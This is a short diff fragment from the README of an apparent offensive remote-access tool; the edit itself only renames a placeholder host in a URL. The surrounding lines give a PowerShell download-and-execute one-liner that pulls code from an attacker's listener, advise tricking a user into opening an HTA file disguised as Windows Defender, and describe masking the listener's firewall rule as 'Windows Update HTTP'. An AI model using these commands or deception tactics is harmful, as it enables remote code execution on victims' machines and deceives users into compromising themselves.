@@ -10,7 +10,7 @@ This script starts a listener on the attacker's machine. The listener needs a po
 On the target machine execute the below command from PowerShell:
 iex (New-Object Net.WebClient).DownloadString("http://ListenerIPAddress/connect")
 
-or trick a user in connecting to: http://IPAddress/WindowsDefender.hta
+or trick a user in connecting to: http://ListenerIPAddress/WindowsDefender.hta
 
 The listener opens incoming traffic on the specified port by the name of "Windows Update HTTP".
 
